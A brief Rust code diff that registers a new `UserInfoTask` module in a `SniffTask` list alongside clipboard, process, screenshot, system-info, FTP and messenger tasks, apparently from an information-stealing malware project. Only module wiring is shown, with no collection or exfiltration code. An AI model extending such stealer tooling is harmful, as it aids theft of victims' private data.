@@ -6,11 +6,13 @@ mod clipboard;
 mod processes;
 mod screenshot;
 mod systeminfo;
+mod userinfo;
 
 use crate::clipboard::ClipboardTask;
 use crate::processes::ProcessesTask;
 use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
+use crate::userinfo::UserInfoTask;
 use alloc::vec;
 use ftp::FtpTask;
 use messengers::MessengersTask;
@@ -28,6 +30,7 @@ impl SniffTask {
                 ProcessesTask,
                 SystemInfoTask,
                 ClipboardTask,
+                UserInfoTask,
                 FtpTask::new(),
                 MessengersTask::new()
             )
